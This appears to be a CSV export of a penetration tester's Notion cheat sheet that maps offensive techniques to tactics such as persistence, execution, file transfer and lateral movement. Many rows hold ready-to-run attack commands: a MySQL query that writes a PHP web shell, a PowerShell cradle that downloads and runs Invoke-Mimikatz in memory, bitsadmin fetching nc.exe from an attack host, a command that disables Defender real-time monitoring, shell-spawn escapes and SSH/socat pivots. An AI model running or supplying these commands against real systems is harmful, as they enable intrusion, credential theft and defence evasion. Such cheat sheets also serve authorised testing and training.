Vector,Description,OS,Security Domains,Target_Technology,URL
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2,FTP Bounce Attack,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),
patator FTP Brute Force,FTP Brute Force,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),https://github.com/lanjelot/patator
"SELECT ""<?php echo shell_exec($_GET['c']);?>"" INTO OUTFILE '/var/www/html/webshell.php';",MySQL write to filesystem,Linux,"Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)",mysql (https://www.notion.so/mysql-1444c8e523768019a5acd8abdc5f59f6?pvs=21),
MSSQL Write to Filesystem,MSSQL Write to filesystem,Windows,"Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)",mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
,,,,,
,,,,,
MSSQL Read files from local filesystem.,MSSQL Read local Files,Windows,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
MSSQL Steal Hashes with Responder,MSSQL Steal Hashes with Responder.,"Linux, Windows",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
MSSQL Impersonate User,MSSQL Impersonate,Windows,Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21),mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
,,,,,
,,,,,
RDP Session Hijack RDP Session Hijacking:,RDP Session Hijack,Windows,"Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21), Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)",rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
"Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name ""DefaultUserName""",Query the registry for Autologin,Windows,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Set SPN Example,Set SPN,Windows,Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21),"PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), PowerView (https://www.notion.so/PowerView-1454c8e523768011a934c27c986b7ef4?pvs=21)",
php://filter/read=convert.base64-encode/resource=config,PHP Read local File,"PHP, Web","Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), LFI (https://www.notion.so/LFI-1434c8e523768048913dcfcd434b772b?pvs=21)",php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
Execute Command via curl and php input filter (GET),Execute Command via curl and php input filter (GET),"PHP, Web",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
Execute command via curl and php input filter (POST),Execute Command via curl and php input filter (POST),"PHP, Web",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
python -m pyftpdlib -p 21,Spin up Python server,"FTP, Linux, Python",File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21)",
impacket-smbserver -smb2support share $(pwd),impacket SMB server,"Impacket, Linux",File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
Zip File Upload Bypass,Bypass file upload restriction by embedding shell in .zip file.,"PHP, Web","Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
Phar File Shell Upload,Upload Phar File and reference it,"PHP, Web","Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",,
LFI Bypass List,LFI Techniques List,"PHP, Web",LFI (https://www.notion.so/LFI-1434c8e523768048913dcfcd434b772b?pvs=21),php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
PHP RCE Examples,RCE PHP Wrappers,"PHP, Web",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
PHP RFI Examples,RFI PHP Techniques,"PHP, Web",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
PHP LFI + Upload Examples,LFI + Upload Techniques,"PHP, Web",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
FFUF Examples,FFUF Useful Examples,Web,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1,Powershell Download File,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1'),Powershell: Download and execute file in memory.,Windows,"Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21), File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)",PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Powershell Upload file after converting it to Base64,PowerShell: Upload file,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe,Download file with bitsadmin,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
"certutil,exe: Download File",Download a file with certutil,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
php file download example,Download a file using php,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip,Copy file from one computer to another: scp,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),
List of Download Cradels,Download Cradle List,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Set up WebDav,WebDave server for file upload,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"Powershell FTP Upload Example
",PowerShell: Upload to FTP Server,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)",
‘exec’ download file.,Use file descriptor to fetch file.,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
HTTPS Python UploadServer Module,Set up Python Uploadserver. -Uploading with curl and Powershell examples included.,"Linux, Windows",File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21)",
ruby -run -ehttpd . -p8000,Ruby Webserver,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), ruby (https://www.notion.so/ruby-1444c8e52376801abb35f1c8328b208f?pvs=21)",
php download file,Download a file using PHP,"Linux, PHP",File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
php download file and pipe to bash,Download file and execute.,"Linux, PHP","File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21), Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)","php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
Ruby Download File,Download a file using Ruby,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"ruby (https://www.notion.so/ruby-1444c8e52376801abb35f1c8328b208f?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
perl download file example,Perl Download file,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"perl (https://www.notion.so/perl-1444c8e523768062bda6f424bc78d32c?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
Javascript/cscript.exe Download File,Download a file using cscript.exe,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), Javascript (https://www.notion.so/Javascript-1444c8e52376800e9015ca6f69087c0e?pvs=21)",
VBScript Download File,Download a file using VBScript,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), VBScript (https://www.notion.so/VBScript-1444c8e5237680a4ba59dae9ce6b70b7?pvs=21)",
HTTP: Python Upload Server,Spin up Python Upload Server HTTP,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
Download File /dev/tcp,Download a file using cat and /dev/tcp,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
Powershell Create Session and Copy File,Powershell: Create session and transfer file,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
xfreedesktop: Mount local folder.,Connect over RDP and mount local folder from Linux,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
Powershell Encrypt File,Encrypt Data,Windows,Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
OpenSSL HTTPS Web server,HTTPS Webserver: OpenSSL,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21)",
BitsAdmin Download file,Transfer File using BitsAdmin,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
WinHTTPRequest Download File,WinHTTPSRequest File Download,Windows,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
PowerShell Download File and Change User Agent,Powershell Change User Agent,Windows,"File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
SVG XSS Example,SVG XSS,Web,Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21),Javascript (https://www.notion.so/Javascript-1444c8e52376800e9015ca6f69087c0e?pvs=21),
SVG XXE,SVG XXE,Web,Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21),xxe (https://www.notion.so/xxe-1434c8e523768048ad75f438f64aa482?pvs=21),
XXE Examples,XXE Payload List,Web,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), LFI (https://www.notion.so/LFI-1434c8e523768048913dcfcd434b772b?pvs=21)",xxe (https://www.notion.so/xxe-1434c8e523768048ad75f438f64aa482?pvs=21),
XXE Injector,XXE Injector GitHub,Web,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),xxe (https://www.notion.so/xxe-1434c8e523768048ad75f438f64aa482?pvs=21),git clone https://github.com/enjoiz/XXEinjector.git
Jenkins GroovyScript,GroovyScript RCE,Web,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),groovyscript (https://www.notion.so/groovyscript-1444c8e52376800a8852d859caab7f27?pvs=21),
Splunk Reverse Shell,Splunk Reverse Shell,Web,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),splunk (https://www.notion.so/splunk-1444c8e52376806c8eb0c2ff66e4632a?pvs=21),
ShellShock Test,ShellShock,"Linux, Web",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>,enumerate based on file created from nmap scan.,"Linux, Web",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21),
cat web_discovery.xml | ./aquatone -nmap,enumerate based on file created from nmap scan,"Linux, Web",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21),
sudo wpscan --url <http://domainnameoripaddress> --enumerate,wpscan —enumerate,"Linux, Web",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),wordpress (https://www.notion.so/wordpress-1444c8e5237680e78fa3df9e89b4bd65?pvs=21),
wpscan brute-force example,wpscan brute force,"Linux, Web",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),wordpress (https://www.notion.so/wordpress-1444c8e5237680e78fa3df9e89b4bd65?pvs=21),
droopescan scan joomla --url http://<domainnameoripaddress>,drupal enumeration,"Linux, Web",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),drupal (https://www.notion.so/drupal-1444c8e523768011b91feea2c5207972?pvs=21),https://github.com/SamJoan/droopescan
joomla-brute example,Joomla Enumeration,"Linux, Web",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),joomla (https://www.notion.so/joomla-1444c8e5237680f8979add39119ffb43?pvs=21),https://github.com/ajnik/joomla-bruteforce/tree/master
gobuster example,GoBuster Enumeration,"Linux, Web",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
auxiliary/scanner/http/tomcat_mgr_login,Tomcat Brute Force,"Linux, Web",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"metasploit (https://www.notion.so/metasploit-1444c8e5237680e18a59ff8a4a9f4f7c?pvs=21), tomcat (https://www.notion.so/tomcat-1444c8e523768076b6d7c8c5e2f1f55c?pvs=21)",
Tomcate Brute Force: mgr_brute.py,Tomcat Brute Force,"Linux, Web",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),tomcat (https://www.notion.so/tomcat-1444c8e523768076b6d7c8c5e2f1f55c?pvs=21),https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
,,,,,
Set-MpPreference -DisableRealtimeMonitoring $true,Powershell Disable Real-Time Monitoring,Windows,Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
use exploit/windows/smb/psexec,Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing smb & psexec,"Linux, Windows",Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),metasploit (https://www.notion.so/metasploit-1444c8e5237680e18a59ff8a4a9f4f7c?pvs=21),
msfvenom examples,msfvenom payload examples,Linux,Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
Eternal Blue,Eternal Blue Exploits,Windows,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
Stabilize Shell,Stabilize an already existing Reverse Shell,Linux,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"perl -e 'exec ""/bin/sh"";'",Perl Spawn Shell,Linux,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), perl (https://www.notion.so/perl-1444c8e523768062bda6f424bc78d32c?pvs=21)",
"ruby: exec ""/bin/sh""",Ruby Spawn Shell,Linux,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), ruby (https://www.notion.so/ruby-1444c8e52376801abb35f1c8328b208f?pvs=21)",
Lua: os.execute('/bin/sh'),Lua Spawn Shell,Linux,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), Lua (https://www.notion.so/Lua-1444c8e523768072bb15c70cd75b18c8?pvs=21)",
"awk 'BEGIN {system(""/bin/sh"")}'",Awk Spawn Shell,Linux,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), awk (https://www.notion.so/awk-1444c8e5237680f89531d4fc3007efd5?pvs=21)",
"find / -name nameoffile 'exec /bin/awk 'BEGIN {system(""/bin/sh"")}' \;",Find Spawn Shell,Linux,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
find . -exec /bin/sh \; -quit,Find Spawn Shell,Linux,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
vim -c ':!/bin/sh',Vim Spawn Shell,Linux,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
sudo -l,Check for sudo availability.,Linux,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
mkfifo reverse shell,mkfifo reverse shell,Linux,"Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
vim escape: spawn shell,Escape Vim and spawn a shell,Linux,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>,SSH comand used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.,Linux,Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21)",
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>,SSH command that instructs the ssh client to request the SSH server forward all data via port 1234 to localhost:3306.,Linux,Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21)",
ssh -D 9050 ubuntu@<IPaddressofTarget>,SSH command used to perform a dynamic port forward on port 9050 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.,Linux,Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21),"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21)",
ProxyChains Setup,Proxy chains setup and usage,Linux,Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
proxychains msfconsole,Send all msfconsole generated traffic through proxy,Linux,Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
python3 -m http.server 8123,Simple Python3 webserver on port 8123,Linux,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21),
ping sweep (Linux),Bash for loop to implement ping sweep.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
ping sweep (Windows),Powershell for loop to implement ping sweep,Windows,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
socat pivot example,Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect(pivot) to the attack host on port 80.,Linux,Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
